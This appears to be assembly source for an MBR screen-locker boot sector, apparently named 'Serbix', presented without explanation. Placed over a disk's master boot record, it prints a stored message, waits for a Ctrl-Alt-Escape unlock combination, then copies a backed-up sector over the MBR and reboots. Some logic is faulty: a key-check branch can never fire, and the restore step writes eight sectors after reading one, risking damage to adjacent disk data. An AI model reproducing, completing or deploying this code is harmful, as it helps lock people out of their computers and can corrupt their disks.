cpu 386
bits 16
org 0h


start:                        ;Ok, dont change this stuff either..
    jmp short load_prog
    ident db "Serbix"

;=====================================================================================================================

load_prog:
    cld
    xor ax,ax
    mov ss,ax
    mov sp,7c00h              ;Setup stack

    mov ax,8000h
    mov es,ax                 ;Initialize es w/ 8000h
    mov ds,ax                 ;Initialize ds w/ 8000h

;=====================================================================================================================

load_1:
    mov ax, 0206h             ;Function/# of sec to read
    mov cx, 0001h             ;0-5 sec # (counts from one), 6-7 hi cyl bits

    ;MDP - Do not clobber DL, it still has the boot drive passed by BIOS
    mov dh, 00h               ;Dh=head dl=drive (bit 7=hdd)
    mov bx, 0h                ;Data buffer, points to es:0
    int 13h
    cmp ah, 0
    jne load_1                ;This is allowable because it is relative

    ;MDP - Save boot drive after you set the proper DS segment (0x8000) and after you read the sector into memory
    mov [BOOT_DRIVE], dl

    push es
    mov ax, prog_continue
    push ax
    retf

;=====================================================================================================================    

prog_continue:
    mov ax, 0x1003
    mov bl, 0
    int 10h

    mov ah, 07h               ;Function to call with interrupt
    mov al, 0x00              ;Scroll whole window
    mov bh, 0x0F              ;Black background with white text
    mov cx, 0x0000            ;Row 0,col 0
    mov dx, 0x184f
    int 10h

    mov dh, 0                 ;Cursor position line
    mov dl, 0                 ;Cursor position column
    mov ah, 02h
    mov bh, 0
    int 10h                   ;Jump one col before

    mov bp, 0400h
    mov ah, 0eh
    mov si, 0ffffh

;=====================================================================================================================

write_char:
    inc si
    cmp byte [ds:bp + si], 0  ;Keep writing until there is a null byte
    jz Keypress
    push bp

    mov al, [byte ds:bp + si]
    mov bx, 07h
    int 10h                   ;Teletype the character
    pop bp
    jmp write_char

;=====================================================================================================================

Keypress:
    mov ah, 86h               ;AH = 86
    mov cx, 50                ;Set for timeout 50
    int 15h                   ;Wait function

    mov ah, 0h                ;AH = 0
    cmp ah, 0h                ;Check same or not same
    jne write_char            ;If same continue else abort

    xor ah,ah                 ;AH = 0
    int 16h                   ;Wait for key
    cmp ah, 01h               ;Scan code 1 = Escape
    jne write_char            ;If Escape not pressed get another key

    mov ah, 2h
    int 16h                   ;Query keyboard status flags
    and al, 0b00001111        ;Mask all the key press flags
    cmp al, 0b00001100        ;Check if ONLY Control and Alt are pressed and make sure Left and/or Right Shift are not being pressed
    jne write_char            ;If not go back and wait for another keystroke ; Otherwise Control-Alt-Escape has been pressed

;=====================================================================================================================

RestoreMBR:
    ;Setup segments
    mov ax, 7c0h              ;AX=7c0h
    mov es, ax

    xor ax, ax                ;AX=0
    mov ss, ax                
    mov sp, 0x7c00            ;SS:SP= 0x0000:0x7c00 stack just below bootloader

    ;Read sector - 2th
    mov bx, buffer            ;ES: BX must point to the buffer
    mov dl, [BOOT_DRIVE]      ;use boot drive passed to bootloader by BIOS in DL
    mov dh,0                  ;head number
    mov ch,0                  ;track number
    mov cl,2                  ;sector number - (2th)
    mov al,1                  ;number of sectors to read
    mov ah,2                  ;read function number
    int 13h

    ;Write sector - 1th
    mov bx, buffer            ;ES: BX must point to the buffer
    mov dl, [BOOT_DRIVE]      ;use boot drive passed to bootloader by BIOS in DL
    mov dh,0                  ;head number
    mov ch,0                  ;track number
    mov cl,1                  ;sector number - (1th)
    mov al,8                  ;number of sectors to write
    mov ah,3                  ;write function number
    int 13h

RebootPC:
    xor ax, ax
    mov es, ax
    mov bx, 1234
    mov [es:0472], bx
    cli
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, ax
    mov ax, 2
    push ax
    mov ax, 0xf000
    push ax
    mov ax, 0xfff0
    push ax
    iret

;=====================================================================================================================

MBR_Signature:
    BOOT_DRIVE: db 0
    times 510-($-$$) db 0
    db 55h,0aah
    times 1024-($-$$) db 0
    db 'TEXT HERE'
    times 4096-($-$$) db 0
    buffer:
